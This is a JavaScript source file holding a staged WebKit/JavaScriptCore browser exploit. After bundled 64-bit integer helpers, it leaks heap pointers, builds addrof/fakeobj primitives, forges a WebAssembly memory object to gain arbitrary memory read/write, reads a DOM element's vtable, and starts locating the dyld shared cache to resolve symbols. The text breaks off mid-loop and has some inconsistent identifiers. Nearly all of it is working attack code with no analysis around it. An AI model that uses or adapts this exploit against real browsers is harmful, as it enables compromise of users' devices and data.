// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

/*function print(s){
    alert(s);
}*/

// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ("0" + b.toString(16)).substr(-2);
    }
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join("");
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== "undefined")
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, " ");
        lines.push(parts.join(" "));
    }

    return lines.join("\n");
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case "number":
            v = "0x" + Math.floor(v).toString(16);
        case "string":
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case "undefined":
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return "0x" + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}
// That's all the arithmetic we need for exploiting WebKit.. :)



function dec2hex(n) {
        if(n < 0) {
            n = 0xFFFFFFFF + n + 1;
        }
        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
    }
function hex2a(hex) {
var str = "";
for (var i = 0; i < hex.length; i += 2) {
    var v = parseInt(hex.substr(i, 2), 16);
    if (v) str += String.fromCharCode(v);
}
return str;
}
    function _u32(i)
{
    return b2u32(this.read(i, 4));
}

function fsyms(mem, base, segs, want, syms)
{
    want = Array.from(want); // copy
    if(syms === undefined)
    {
        syms = {};
    }

    var stab = null;
    alert1("here");
    var ncmds = memory.u32(Add(base, 0x10));
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = memory.u32(Add(base, off))
        if(cmd == 0x2) // LC_SYMTAB
        {
            var b = memory.read(Add(base, off + 0x8), 0x10);
            stab =
            {
                symoff:  b2u32(b.slice(0x8, 0xc)),
                nsyms:   b2u32(b.slice(0xc, 0x10)),
                stroff:  b2u32(b.slice(0x10, 0x14)),
                strsize: b2u32(b.slice(0x14, 0x18)),
            };
            break;
        }
        off += memory.u32(Add(base, off + 0x4));
    }
    if(stab == null)
    {
        fail("stab");
    }
    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
    var fn = function(i)
    {
        return memory.read(Add(tmp.base, tmp.off + i),0x10);
    };
    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
    {
        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
        for(var j = 0; j < want.length; ++j)
        {
            var s = want[j];
            if((strcmp(fn, s)))
            {
                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                want.splice(j, 1);
                break;
            }
        }
    }
    return syms;
}

var FPO = typeof(SharedArrayBuffer) === "undefined" ? 0x18 : 0x10;
var VM_PROT_NONE = 0x0
var VM_PROT_READ = 0x1
var VM_PROT_WRITE = 0x2
var VM_PROT_EXECUTE = 0x4

function b2u32(b){
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}
function hexdump1(buffer, blockSize, base) {
    blockSize = blockSize || 16;
    var lines = [];
    var hex = "0123456789ABCDEF";
    for (var b = 0; b < buffer.length; b += blockSize) {
        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
        var codes = block.split('').map(function (ch) {
            var code = ch.charCodeAt(0);
            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
        }).join("");
        codes += "   ".repeat(blockSize - block.length);
        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
        chars +=  " ".repeat(blockSize - block.length);
        lines.push(addr + " " + codes + "  " + chars);
    }
    return lines.join("<br/>");
}

function mappedAddress(mapping, addr1) {
    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
    for (cc = 0; cc < mapping.length; ++cc) {
        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
            // >= <
            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
            //alert("debug-cacheoffset:" + cacheoffset)
            return cacheoffset;
        }
        else {
            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
        }
    }
}
function off2addr(mappings, off)
    {
  
        if(!(off instanceof Int64)) off = new Int64(off);
        for(var i = 0; i < mappings.length; ++i)
        {
            var start = mappings[i].fileoff; //cachestart
            var end   = Add(start, segs[i].size); //cacheend
           // alert("start" + start + "end" + end + "off" + off)
            if
            (
                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
            )
            {
                //print1ic = 1;
                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                return Add(mappings[i].addr, Sub(off, start));
            }

        }
        //return new Int64("0x4141414141414141");
    }

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => {
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => {
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
function change_container(header, arr){
    try{}
    catch{}
    for(var i = 0; i < 0x100000; i++){
        ds[i].cellHeader = header;
        ds[i].butterfly = arr;
    }
}
const MY_OBJECT_OFFSET = 0x14fb0;
//MakeJitCompiledFunction();
//MakeJitCompiledFunction();


var a= new Array(10);
for(var i = 0; i < 0x1000; i++)
  a[i]= Array(0x40).fill(0.0);
var b = Array(0x40).fill(0.0);
var c = Array(0x40).fill(0.0);
var ds = new Array(0x100000);

let noCoW =13.37
let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);



var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_1'] = 13.37;
let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

//var gcPreventer = [];
var structure_id = 0;
c[0] = 1.1;
var fuck = undefined;
var fuck2 = undefined;
var driver = undefined;
var stage = "leak"
var jscell_header = undefined;
var evil_arr_butterfly = undefined;
var expected_ptr = undefined;
eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);
b.process = (inputs, outputs, parameters)=>{
    //sa
    if(stage == "leak"){
        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
        expected_ptr = Number(expected_ptr);
        c[8] = qwordAsFloat(expected_ptr + 0x4010);
        c[9] = qwordAsFloat(0x0);
        stage  = "bypass_etc";
        fuck.port.postMessage(c);
        //sleep(4000);
        return true;
    }
    else if(stage == "bypass_etc"){
        //fuck.port.postMessage(typeof parameters);
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[0]);
        }
        jscell_header = gcPreventer[0];
        
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[1]);
        }
        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
        
        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
        if(structure_id == 0 ){
            fuck.port.postMessage(`retry`);
            
            c[8] = qwordAsFloat(0);
            parameters = null;
            //sleep(10000000);
            //stage = "leak";
            return false;
        }
        fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
        
        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
        //return false;
        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
        //change_container(cellHeader, evil_arr);
        c[8] = qwordAsFloat(evil_arr_butterfly);
        evil_arr[0] = cellHeader;
        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);

        stage = "r/w";
        return true;
    }
    else if(stage == "r/w"){
        for(var i =0; i < 2; i++){
            let a = i == 0 ? parameters: pad;
            a[0] = qwordAsFloat(0x133700001337);
        }
        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
        evil_arr[1] = qwordAsFloat(0);
        var boxed_offset = 0;
        for(var i = 0; i < evil_arr.length; i++){
            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
                boxed_offset = i;
                break;
            }
        }
        var addrof = (obj)=>{
            boxed[0] = obj;
            return floatAsQword(evil_arr[boxed_offset]);
        }
        var fakeObj = (addr)=>{
            evil_arr[boxed_offset] = qwordAsFloat(addr);
            return boxed[0];
        }
        stage="gc_test"
        return true;
    }
    else if(stage=="gc_test"){
        gc();
        fuck.port.postMessage("Garbage Collected");
        //sleep(100000);
        stage = "wasmfaker";
        return true;
    }
    else if (stage=="wasmfaker") {
    debugger;
    let fail = function fail(x)
    {
        fuck.port.postMessage("FAIL: " + x);
        location.reload();
        throw null;
    }
        var print1 = fuck.port.postMessage();
        function foo(obj) {
   return delete obj["x"];
 }
// noInline(foo);
//foo(null);

  let o = {};

  for (let i = 0; i < 10000; ++i) {
   Object.defineProperty(o, "x", {});
   foo({});
   foo({x:0x4141414141});
}
        fuck.port.postMessage("starting")
        print1("[*] Spraying structures to get a butterfly (1/2)...");
        // copy paste from: 
        // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
        var structs = [];
        for (var i = 0; i < 0x5000; i++) {
            var a = new Float64Array(1);
            a["prop" + i] = 1337;
            structs.push(a);
        }
        
        print1('[*] Spraying structures to get a butterfly (2/2)...');
        for (var i = 0; i < 500; i++) {
            var a = new WebAssembly.Memory({inital: 0});
            a["prop" + i] = 1339;
            structs.push(a);
        }
        
        print1("[*] Preparing R/W primitives...");
        
        var webAssemblyCode ="\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b";
        var webAssemblyBuffer = str2ab(webAssemblyCode);
        var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
        
        var jsCellHeader = new Int64([
            0x00, 0x10, 0x00, 0x00,
            0x0,                    
            0x2c,                   
            0x08,                  
            0x1                     
        ]);
        
        var wasmBuffer = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: null,
            memory: null,
            deleteMe: null
        };
        
        var wasmInternalMemory = {
            jsCellHeader: null,
            memoryToRead: {}, 
            sizeToRead: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
            size: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
            initialSize: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
            junk1: null,
            junk2: null,
            junk3: null,
            junk4: null,
            junk5: null,
        };
        
        var leaker = {
            objectToLeak: null
        };
        delete wasmBuffer.butterfly;
        delete wasmBuffer.vector;
        delete wasmBuffer.deleteMe;
        delete wasmInternalMemory.junk1;
        delete wasmInternalMemory.junk2;
        delete wasmInternalMemory.junk3;
        delete wasmInternalMemory.junk4;
        delete wasmInternalMemory.junk5;
        
        var realWasmMem = new WebAssembly.Memory({inital: 0x1});
        sleep(5);
        var wasmBufferRawAddr = addrof(wasmBuffer);
        if (wasmBufferRawAddr == 0x7ff8000000000000) {
            //print1("[+] Got A NAN address which invalid reloading");
            fail("[+] Got A NAN address which is invalid ... reloading");
        }
        print1("[+] Got WebAssembly buffer at 0x"+wasmBufferRawAddr.toString(16));
        let u = new Int64(wasmBufferRawAddr).toString()[9];
        var fakeWasmBuffer = fakeobj(wasmBufferRawAddr+16);
        var maxtry = 0;
        
        if (fakeWasmBuffer instanceof WebAssembly.Memory) {
            print1("gotcha!");
            //continue;
        } else {
            while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
            wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
            maxtry++;
            if (maxtry == 100000)
            {
                fail("wow 5000 tries on getting valid structid failed!!!");
            }
        }
            print1("[+] Successfully got fakeobj as WASMObject");
    } /*else {
        print1('[+] Successfully got fakeobj as WASMObject');
    }*/
        //print1('[+] Successfully got fakeobj as WASMObject');
        var wasmMemRawAddr = addrof(wasmInternalMemory);
        var wasmMem = fakeobj(wasmMemRawAddr+16);    
        
        wasmBuffer.memory = wasmMem;
        
        var importObject = {
            imports: {
                mem: fakeWasmBuffer
            }
        };
        
        print1("[*] We now have early R/W primitives that should work with the WASM memory...");
        
        function read_i64(readingFunc, offset) {
            var low = readingFunc(offset * 4);
            var midLow = readingFunc((offset * 4) + 1);
            var midHigh = readingFunc((offset * 4) + 2);
            var high = readingFunc((offset * 4) + 3);
            return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
        }
        function write_i64(writingFunc, offset, value) {
            writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
            writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
            writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
            writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
        }
        
        function createObjWriter(obj) {
            wasmInternalMemory.memoryToRead = obj;
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
    
        
        var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
        var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
        
        function createDirectWriter(address) {
            wasmInternalBufferWriter.write_i64(1, address);
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
        
        var realWasmWriter = createObjWriter(realWasmMem);
        var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
        wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
        /*for (var z = 0; z < 10000; z++) {
            var chewjittime = [0x7fff000000000000];
            chewjittime[1] = {a:0x41312111};
        }*/
        var leakerWriter = createObjWriter(leaker);
        wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
        var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
        importObject.imports.mem = realWasmMem;
        
        addrof = function(obj) {
            leaker.objectToLeak = obj;
            return leakerWriter.read_i64(2);
        }
        
        fakeobj = function(addr) {
            leakerWriter.write_i64(2, addr);
            return leaker.objectToLeak;
        }
        
        createObjWriter = function(obj) {
            return createDirectWriter(addrof(obj));
        }
        
        var writer = createObjWriter(wasmMem);
        writer.write_i64(0, Int64.One);
        var wasmBufferWriter = createObjWriter(wasmBuffer);
        var writer = createObjWriter(wasmInternalMemory);
        wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007')); 
        wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
        
        writer.write_i64(4, Int64.Zero);
        writer.write_i64(5, Int64.Zero);
        writer.write_i64(6, Int64.Zero);
        writer.write_i64(7, Int64.Zero);
        writer.write_i64(0, new Int64('0x0000000000000007'));
        writer.write_i64(2, new Int64('0x0000000000000007'));
        
        print1("[*] We now have stable R/W primitives, hooray!");
        var memory = {
            create_writer: function(addrObj) {
                if (addrObj instanceof Int64) {
                    var writer = createDirectWriter(addrObj);
                    return writer;
                } else {
                    var writer = createObjWriter(addrObj);
                    return writer;
                }
            },
            read_i64: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i64(offset);
            },
            write_i64: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i64(offset, value);
            },
            read_i32: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return new Int64(writer.read_i32(offset));
            },
            write_i32: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i32(offset, value);
            },
            read_i8: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i8(offset);
            },
            write_i8: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i8(offset, value);
            },
            write: function(addrObj, data, length) {
                var offset = 0;
                var writer = this.create_writer(addrObj);
                for (var i = 0; i < length; i++) {
                    writer.write_i8(offset + i, data[i]);
                }
            },
            read: function(addrObj, length) {
                var offset = 0;
                var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = writer.read_i8(offset + i);
                }
                return arr;
            },
            readInt64: function(addrObj) {
                //var offset = 0;
                //var writer = this.create_writer(addrObj);
                return this.read_i64(addrObj,0);
            },
            writeInt64: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i64(offset, value);
            },
            copyfrom: function(addrObj, offset, length) {
                offset = 0;
                var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = writer.read_i8(offset + i);
                }
                return arr;
            },
            write_non_zero: function(where, what) {
            for (var i = 0; i < what.length; ++i) {
                if (what[i] != 0) {
                        this.write_i64(where + i*8, 0, what[i])
                }
            }
           },
        }
        stage = "parsecache";
        return true;
    }
    else if(stage =="parsecache") {
        print1("success now about to parse dyld shared cache...");
        memory.u32 = _u32;
        //gigauncager();

        print1("[*] Creating the HTMLDivElement wrapper...");
        var d = document.createElement("div");
        let ad_div = addrof(d);
        print1("[+] Address of the div is "+ad_div.toString(16));
        //alert(FPO)
        let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
        print1("[+] Executable instance is at "+exe_ptr.toString(16));
        let v_tlb = memory.read_i64(exe_ptr,0);
        print1("[+] divelement vtable seems to be at "+v_tlb.toString(16));
        var anchor = memory.read_i64(v_tlb,0);
        //function exponentiate(x, y) { return x ** y; }
        /*var l1, l2;
        l1[0] = {}
        l2[0] = {};
        var expr = "l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0];";
        
        for (let i = -50; i <= 50; i += 0.1)
            eval(expr)
            for (let j = 0; j <= 1000; j++)
                exponentiate(i, j);*/
        //var anchor1 = memory.read_i64(anchor,0);
        //print1('anchor:' + anchor)
        //anchor is webcore
        //var vtab = 0x1B205A808;
        //var nslide = Sub(v_tlb, vtab) - 0x10;
        var hdr = Sub(anchor, anchor.lo() & 0xfff);
        //cache
       /*struct dyld_cache_header
       {
           char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
           uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
           uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
           uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
           uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
           uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
           //28?
           uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x2C
           uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //
           uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x34
           uint64_t    slideInfoSize;            // size of kernel slid info 0x3C
           uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
           //0x44
           uint64_t    localSymbolsSize; //0x4C       // size of local symbols information
           uint8_t        uuid[16]; // 0x54                // unique value for each shared cache file
           uint64_t    cacheType;         //0x64      // 1 for development, 0 for optimized
       };*/
       
       print1("dyld cache header @" + hdr); //dyld_cache_header
        while(true)
        {
